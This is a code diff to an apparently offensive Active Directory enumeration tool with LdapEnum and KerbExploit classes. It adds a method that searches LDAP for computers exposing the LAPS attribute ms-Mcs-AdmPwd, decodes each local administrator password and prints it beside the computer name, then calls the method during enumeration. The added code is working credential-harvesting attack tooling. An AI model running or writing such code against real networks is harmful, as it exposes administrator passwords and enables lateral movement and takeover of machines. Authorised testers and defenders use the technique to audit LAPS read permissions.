@@ -272,7 +272,17 @@ class LdapEnum:
             baseName = info[0]
             username = info[1]
             log.info("Username: " + highlightRed(username) + CreateSpace(username) +LdapPathColor(baseName))
-            
+    def GetLapsPassword(self)->None:
+        printTitle("[-] Laps Password")
+
+        OBJECT_TO_SEARCH = '(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))'
+        ATTRIBUTES_TO_SEARCH = ['ms-Mcs-AdmPwd','SAMAccountname']
+
+        result = self.__SearchServerLdap(OBJECT_TO_SEARCH, ATTRIBUTES_TO_SEARCH)
+        for info in result:
+            computer_name = info[1]['sAMAccountName'][0].decode()
+            admin_passwd = info[1]['ms-Mcs-AdmPwd'][0].decode()
+            log.info("Computer: " + highlightRed(computer_name) + CreateSpace(computer_name) + 'Password: '+highlightRed(admin_passwd))
     def disconnect(self)->None:
         self.ldapCon.unbind() 
 
@@ -286,6 +296,7 @@ class LdapEnum:
         self.GetUserAndDescription()
         self.UserDefEncrypt()
         self.UserNoDelegation()
+        self.GetLapsPassword()
 
 class KerbExploit:
     
